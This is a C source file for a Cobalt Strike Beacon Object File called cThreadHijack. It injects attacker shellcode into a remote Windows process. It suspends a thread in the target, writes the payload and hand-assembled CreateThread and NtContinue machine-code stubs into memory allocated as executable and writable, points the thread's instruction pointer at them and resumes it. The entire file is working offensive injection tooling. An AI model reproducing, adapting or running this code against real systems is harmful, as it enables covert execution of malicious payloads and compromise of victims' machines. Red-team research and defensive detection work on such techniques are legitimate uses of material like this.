// cThreadHijack: Beacon Object File (BOF) to identify a legitimate thread within a remote process, suspend it, point the thread to shellcode, and resume/restore it
// Author: Connor McGarr (@33y0re)

#include <Windows.h>
#include <TlHelp32.h>
#include "libc.h"
#include "beacon.h"

void go(char* argc, int len)
{
	// Function declarations
	WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
	WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
	WINBASEAPI void* WINAPI MSVCRT$malloc(SIZE_T);
	DECLSPEC_IMPORT void WINAPI MSVCRT$free(void*);
	DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
	WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
	WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
	WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
	WINBASEAPI BOOL WINAPI KERNEL32$WriteProcessMemory(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T);
	WINBASEAPI BOOL WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);
	WINBASEAPI HANDLE WINAPI KERNEL32$OpenThread(DWORD, BOOL, DWORD);
	WINBASEAPI BOOL WINAPI KERNEL32$Thread32First(HANDLE, LPTHREADENTRY32);
	WINBASEAPI BOOL WINAPI KERNEL32$Thread32Next(HANDLE, LPTHREADENTRY32);
	WINBASEAPI DWORD WINAPI KERNEL32$SuspendThread(HANDLE);
	WINBASEAPI DWORD WINAPI KERNEL32$ResumeThread(HANDLE);
	WINBASEAPI BOOL WINAPI KERNEL32$GetThreadContext(HANDLE, LPCONTEXT);
	NTSYSAPI VOID WINAPI NTDLL$RtlMoveMemory(PVOID, const VOID*, SIZE_T);
	WINBASEAPI BOOL WINAPI KERNEL32$SetThreadContext(HANDLE, LPCONTEXT);
	WINBASEAPI DWORD WINAPI KERNEL32$GetLastError();

	// Parameters needed for BOFs to take in input
	// datap is a typedef'd structure
	datap parser;
	DWORD payloadSize = NULL;

	// Parse arguments
	BeaconDataParse(&parser, argc, len);

	// Store the desired PID
	int pid = BeaconDataInt(&parser);

	// Store the payload and grab the size
	char* shellcode = (char*)BeaconDataExtract(&parser, &payloadSize);

	// Define NTSTATUS code
	NTSTATUS statusSuccess = (NTSTATUS)0x00000000;

	// Print update
	BeaconPrintf(CALLBACK_OUTPUT, "[+] Target process PID: %d\n", pid);

	// Open up a handle to the targeted process
	HANDLE processHandle = KERNEL32$OpenProcess(
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
		FALSE,
		(DWORD)pid
	);

	// Error handling
	if (processHandle == NULL)
	{
		BeaconPrintf(CALLBACK_ERROR, "Error! Unable to open a handle to the process. Error: 0x%lx\n", KERNEL32$GetLastError());
	}
	else
	{
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Opened a handle to PID %d\n", pid);

		// Parameters for call to CreateToolhelp32Snapshot()
		THREADENTRY32 lpte;
		lpte.dwSize = sizeof(THREADENTRY32);
		HANDLE desiredThread = NULL;

		// Get a snapshot of all of the threads
		HANDLE threadSnapshot = KERNEL32$CreateToolhelp32Snapshot(
			TH32CS_SNAPTHREAD,
			0
		);

		// Parse the threads and look for the first thread within the target process
		if (KERNEL32$Thread32First(threadSnapshot, &lpte) == TRUE)
		{
			while (KERNEL32$Thread32Next(threadSnapshot, &lpte) == TRUE)
			{
				// Stop when the first thread of the target process is found and open a handle to the thread
				if (lpte.th32OwnerProcessID == pid)
				{
					// Print update
					BeaconPrintf(CALLBACK_OUTPUT, "[+] Found a thread in the target process! Thread ID: %d\n", lpte.th32ThreadID);

					// Open a handle to the thread
					desiredThread = KERNEL32$OpenThread(
						THREAD_SUSPEND_RESUME | THREAD_SET_CONTEXT | THREAD_GET_CONTEXT,
						FALSE,
						lpte.th32ThreadID
					);

					// Break the loop
					break;
				}
			}
		}

		// Close up the handle
		KERNEL32$CloseHandle(
			threadSnapshot
		);

		// Print update
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Suspending the targeted thread...\n");

		// Suspend the targeted thread
		DWORD suspendThread = KERNEL32$SuspendThread(
			desiredThread
		);

		// Parameter for call to GetThreadContext() and SetThreadContext()
		CONTEXT cpuRegisters = { 0 };
		cpuRegisters.ContextFlags = CONTEXT_ALL;

		// Dump the state of the registers of the current thread
		BOOL getContext = KERNEL32$GetThreadContext(
			desiredThread,
			&cpuRegisters
		);

		// Error handling
		if (!getContext)
		{
			BeaconPrintf(CALLBACK_ERROR, "Error! Unable to get the state of the target thread. Error: 0x%lx\n", KERNEL32$GetLastError());
		}
		else
		{
			// Inject shellcode into remote process
			// This address will be used for local thread creation within the remote process eventually
			PVOID placeRemotely = KERNEL32$VirtualAllocEx(
				processHandle,
				NULL,
				payloadSize,
				MEM_RESERVE | MEM_COMMIT,
				PAGE_EXECUTE_READWRITE
			);

			// Error handling
			if (placeRemotely == NULL)
			{
				BeaconPrintf(CALLBACK_ERROR, "Error! Unable to allocate memory within the remote process. Error: 0x%lx\n", KERNEL32$GetLastError());
			}
			else
			{
				// Write the shellcode to the remote buffer
				BOOL writeRemotely = KERNEL32$WriteProcessMemory(
					processHandle,
					placeRemotely,
					shellcode,
					payloadSize,
					NULL
				);

				// Error handling 
				if (!writeRemotely)
				{
					BeaconPrintf(CALLBACK_ERROR, "Error! Unable to write shellcode to allocated buffer. Error: 0x%lx\n", KERNEL32$GetLastError());
				}
				else
				{
					BeaconPrintf(CALLBACK_OUTPUT, "[+] Wrote Beacon shellcode to the remote process!\n");

					// Create shellcode for CreateThread routine to be executed in the remote buffer via the hijacked thread
					BYTE createThread[64] = { NULL };

					// Casting shellcode address to LPTHREAD_START_ROUTINE function pointer
					LPTHREAD_START_ROUTINE threadCast = (LPTHREAD_START_ROUTINE)placeRemotely;

					// Counter for array indexing
					int z = 0;

					// __fastcall calling convention: RCX =  LPSECURITY_ATTRIBUTES (NULL), RDX = dwStackSize (0), R8 = LPTHREAD_START_ROUTINE (shellcode address), R9 = lpParameter (NULL)
					// RSP + 20h = dwCreationFlags (0), RSP + 28h = lpThreadId (NULL)

					// xor rcx, rcx
					createThread[z++] = 0x48;
					createThread[z++] = 0x31;
					createThread[z++] = 0xc9;

					// xor rdx, rdx
					createThread[z++] = 0x48;
					createThread[z++] = 0x31;
					createThread[z++] = 0xd2;

					// mov r8, LPTHREAD_START_ROUTINE
					createThread[z++] = 0x49;
					createThread[z++] = 0xb8;
					mycopy(createThread + z, &threadCast, sizeof(threadCast));
					z += sizeof(threadCast);

					// xor r9, r9
					createThread[z++] = 0x4d;
					createThread[z++] = 0x31;
					createThread[z++] = 0xc9;

					// mov [rsp+20h], r9 (which already contains 0)
					createThread[z++] = 0x4c;
					createThread[z++] = 0x89;
					createThread[z++] = 0x4c;
					createThread[z++] = 0x24;
					createThread[z++] = 0x20;

					// mov [rsp+28h], r9 (which already contains 0)
					createThread[z++] = 0x4c;
					createThread[z++] = 0x89;
					createThread[z++] = 0x4c;
					createThread[z++] = 0x24;
					createThread[z++] = 0x28;

					// Resolve the address of CreateThread
					unsigned long long createthreadAddress = KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32"), "CreateThread");

					// Error handling
					if (createthreadAddress == NULL)
					{
						BeaconPrintf(CALLBACK_ERROR, "Error! Unable to resolve CreateThread. Error: 0x%lx\n", KERNEL32$GetLastError());
					}
					else
					{
						// mov rax, CreateThread
						createThread[z++] = 0x48;
						createThread[z++] = 0xb8;
						mycopy(createThread + z, &createthreadAddress, sizeof(createthreadAddress));
						z += sizeof(createthreadAddress);

						// call rax (call CreateThread)
						createThread[z++] = 0xff;
						createThread[z++] = 0xd0;

						// Return to the caller in order to kick off NtContinue routine
						createThread[z++] = 0xc3;

						// NtContinue is invoked locally, not remotely - Need to create NtContinue routine to be carried to the hijacked thread for thread restoration 
						// Since the CONTEXT record for the hijacked thread was obtained remotely, it needs to be embedded into the NtContinue routine, as the address space from the Beacon process is not visible to the remote process

						// Create byte array for NtContinue routine, counter, and stack alignment routine byte array
						BYTE ntContinue[64] = { NULL };
						int i = 0;
						BYTE stackAlignment[4] = { NULL };

						// First calculate the size of a CONTEXT record and NtContinue routine
						// Then, "jump over shellcode" by calling the buffer at an offset of the calculation (64 bytes + CONTEXT size)

						// 0xe8 is a near call, which uses RIP as the base address for RVA calculations and dynamically adds the offset specified by shellcodeOffset
						// Placing at an index of 0 to begin the routine
						ntContinue[i++] = 0xe8;

						// Subtracting to compensate for the near call opcode (represented by i) and the DWORD used for relative addressing
						DWORD shellcodeOffset = sizeof(ntContinue) + sizeof(CONTEXT) - sizeof(DWORD) - i;
						mycopy(ntContinue + i, &shellcodeOffset, sizeof(shellcodeOffset));

						// Update counter with location buffer can be written to
						i += sizeof(shellcodeOffset);

						// Near call instruction to call the address directly after, which is used to pop the pushed return address onto the stack with a RVA from the same page (call pushes return address onto the stack)
						ntContinue[i++] = 0xe8;
						ntContinue[i++] = 0x00;
						ntContinue[i++] = 0x00;
						ntContinue[i++] = 0x00;
						ntContinue[i++] = 0x00;

						// The previous call instruction pushes a return address onto the stack
						// The return address will be the address, in memory, of the upcoming pop rcx instruction
						// Since current execution is no longer at the beginning of the ntContinue routine, the distance to the CONTEXT record is no longer 64-bytes
						// The address of the pop rcx instruction will be used as the base for RVA calculations to determine the distance between the value in RCX (which will be the address of the 'pop rcx' instruction) to the CONTEXT record
						// Obtaining the current amount of bytes executed thus far
						int contextOffset = i;

						// __fastcall calling convention
						// NtContinue requires a pointer to a context record and an alert state (FALSE in this case)
						// pop rcx (get return address, which isn't needed for anything, into RCX for RVA calculations)
						ntContinue[i++] = 0x59;

						// The address of the pop rcx instruction is now in RCX
						// Adding the distance between the CONTEXT record and the current address in RCX
						// add rcx, distance to CONTEXT record
						ntContinue[i++] = 0x48;
						ntContinue[i++] = 0x83;
						ntContinue[i++] = 0xc1;

						// Value to be added to RCX
						// The distance between the value in RCX (address of the 'pop rcx' instruction) and the CONTEXT record can be found by subtracting the amount of bytes executed up until the 'pop rcx' instruction and the original 64-byte offset
						ntContinue[i++] = sizeof(ntContinue) - contextOffset;

						// xor rdx, rdx
						// Set to FALSE
						ntContinue[i++] = 0x48;
						ntContinue[i++] = 0x31;
						ntContinue[i++] = 0xd2;

						// Place NtContinue into RAX
						ntContinue[i++] = 0x48;
						ntContinue[i++] = 0xb8;

						// Although the thread is in a remote process, the Windows DLLs mapped to the Beacon process, although private, will correlate to the same virtual address
						unsigned long long ntcontinueAddress = KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("ntdll"), "NtContinue");

						// Error handling. If NtContinue cannot be resolved, abort
						if (ntcontinueAddress == NULL)
						{
							BeaconPrintf(CALLBACK_ERROR, "Error! Unable to resolve NtContinue.\n", KERNEL32$GetLastError());
						}
						else
						{
							// Copy the address of NtContinue function address to the NtContinue routine buffer
							mycopy(ntContinue + i, &ntcontinueAddress, sizeof(ntcontinueAddress));

							// Update the counter with the correct offset the next bytes should be written to
							i += sizeof(ntcontinueAddress);

							// Allocate some space on the stack for the call to NtContinue
							// sub rsp, 0x20
							ntContinue[i++] = 0x48;
							ntContinue[i++] = 0x83;
							ntContinue[i++] = 0xec;
							ntContinue[i++] = 0x20;

							// call NtContinue
							ntContinue[i++] = 0xff;
							ntContinue[i++] = 0xd0;

							// Create 4 byte buffer to perform bitwise AND with RSP to ensure 16-byte aligned stack for the call to shellcode
							// and rsp, 0FFFFFFFFFFFFFFF0
							stackAlignment[0] = 0x48;
							stackAlignment[1] = 0x83;
							stackAlignment[2] = 0xe4;
							stackAlignment[3] = 0xf0;

							// Allocating memory for final buffer
							// Size of NtContinue routine, CONTEXT structure, stack alignment routine, and CreateThread routine
							PVOID shellcodeFinal = (PVOID)MSVCRT$malloc(sizeof(ntContinue) + sizeof(CONTEXT) + sizeof(stackAlignment) + sizeof(createThread));

							// Copy NtContinue routine to final buffer
							mycopy(shellcodeFinal, ntContinue, sizeof(ntContinue));

							// Copying CONTEXT structure, stack alignment routine, and CreateThread routine to the final buffer
							// Allocation is already a pointer (PVOID) - casting to a DWORD64 type, a 64-bit address, in order to write to the buffer at a desired offset
							// Using RtlMoveMemory for the CONTEXT structure to avoid casting to something other than a CONTEXT structure
							NTDLL$RtlMoveMemory((DWORD64)shellcodeFinal + sizeof(ntContinue), &cpuRegisters, sizeof(CONTEXT));
							mycopy((DWORD64)shellcodeFinal + sizeof(ntContinue) + sizeof(CONTEXT), stackAlignment, sizeof(stackAlignment));
							mycopy((DWORD64)shellcodeFinal + sizeof(ntContinue) + sizeof(CONTEXT) + sizeof(stackAlignment), createThread, sizeof(createThread));

							// Declare a variable to represent the final length
							int finalLength = (int)sizeof(ntContinue) + (int)sizeof(CONTEXT) + sizeof(stackAlignment) + sizeof(createThread);

							// Inject the shellcode into the target process with read/write permissions
							PVOID allocateMemory = KERNEL32$VirtualAllocEx(
								processHandle,
								NULL,
								finalLength,
								MEM_RESERVE | MEM_COMMIT,
								PAGE_EXECUTE_READWRITE
							);

							if (allocateMemory == NULL)
							{
								BeaconPrintf(CALLBACK_ERROR, "Error! Unable to allocate memory in the remote process. Error: 0x%lx\n", KERNEL32$GetLastError());
							}
							else
							{
								BeaconPrintf(CALLBACK_OUTPUT, "[+] Virtual memory for CreateThread and NtContinue routines allocated at 0x%llx inside of the remote process!\n", allocateMemory);

								// Write shellcode to the new allocation
								BOOL writeMemory = KERNEL32$WriteProcessMemory(
									processHandle,
									allocateMemory,
									shellcodeFinal,
									finalLength,
									NULL
								);

								if (!writeMemory)
								{
									BeaconPrintf(CALLBACK_ERROR, "Error! Unable to write memory to the buffer. Error: 0x%llx\n", KERNEL32$GetLastError());
								}
								else
								{

									BeaconPrintf(CALLBACK_OUTPUT, "[+] Size of NtContinue routine: %lu bytes\n[+] Size of CONTEXT structure: %lu bytes\n[+] Size of stack alignment routine: %d\n[+] Size of CreateThread routine: %lu\n[+] Size of shellcode: %d bytes\n", sizeof(ntContinue), sizeof(CONTEXT), sizeof(stackAlignment), sizeof(createThread), payloadSize);
									BeaconPrintf(CALLBACK_OUTPUT, "[+] Wrote payload to buffer inside previously allocated buffer!\n");
									BeaconPrintf(CALLBACK_OUTPUT, "[+] Current RIP: 0x%llx\n", cpuRegisters.Rip);

									// Allocate stack space by subtracting the stack by 0x2000 bytes
									cpuRegisters.Rsp -= 0x2000;

									// Change RIP to point to our shellcode and typecast buffer to a DWORD64 because that is what a CONTEXT structure uses
									cpuRegisters.Rip = (DWORD64)allocateMemory;

									// Set RIP
									BOOL setRip = KERNEL32$SetThreadContext(
										desiredThread,
										&cpuRegisters
									);

									// Error handling
									if (!setRip)
									{
										BeaconPrintf(CALLBACK_ERROR, "Error! Unable to set the target thread's RIP register. Error: 0x%lx\n", KERNEL32$GetLastError());
									}
									else
									{
										BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully pointed the target thread's RIP register to the shellcode!\n");
										BeaconPrintf(CALLBACK_OUTPUT, "[+] Current RIP: 0x%llx\n", cpuRegisters.Rip);
										BeaconPrintf(CALLBACK_OUTPUT, "[+] Resuming the thread! Please wait for the Beacon payload to execute. This could take some time...\n");

										// Call to ResumeThread()
										DWORD resume = KERNEL32$ResumeThread(
											desiredThread
										);

										// Free the buffer used for the whole payload
										MSVCRT$free(
											shellcodeFinal
										);
									}
								}
							}
						}
					}
				}
			}
		}

		// Close handle
		KERNEL32$CloseHandle(
			desiredThread
		);
	}

	// Close handle
	KERNEL32$CloseHandle(
		processHandle
	);
}